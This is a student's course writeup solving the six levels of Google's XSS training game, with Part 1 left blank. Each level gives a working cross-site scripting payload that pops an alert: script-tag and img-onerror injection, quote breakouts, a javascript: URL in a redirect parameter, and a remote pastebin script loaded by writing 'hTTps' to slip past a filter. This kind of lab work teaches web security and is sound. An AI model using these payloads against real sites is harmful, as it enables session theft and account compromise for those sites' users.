# Crypto II Writeup

Name: Michael Wong
Section: 0201

I pledge on my honor that I have not given or received any unauthorized
assistance on this assignment or examination.

Digital acknowledgement: Michael Wong

## Assignment Writeup

### Part 1 (40 Pts)

### Part 2 (60 Pts)

Level 1:

a) Input the following in to the search boc
 <script>alert(1);</script>

Level 2:

a) Input the following into the chat box
  <img src="http://inexist.ent" onerror="javascript:alert(1)"/>

Level 3:

a) Input the following in the url
  https://xss-game.appspot.com/level3/frame#2.jpg'/><script>alert(1);</script>


Level 4
  
a) Input the following in to the input box
  3'); alert(‘1

Level 5
  
a) Click sign up for an exclusive beta

b) Instead of entering an email, we can change the url from:
  https://xss-game.appspot.com/level5/frame/signup?next=confirm

  to

  https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(0);

c) and click next

Level 6:

a) Make a pastebin post with “alert(1);”

b) Get the link to the raw file https://pastebin.com/raw/F6navA5Q

c) Change 'https' to something like 'hTTps' in order to bypass the input sanitation

d) Put this into the url

  https://xss-game.appspot.com/level6/frame#hTTps://pastebin.com/raw/F6navA5Q
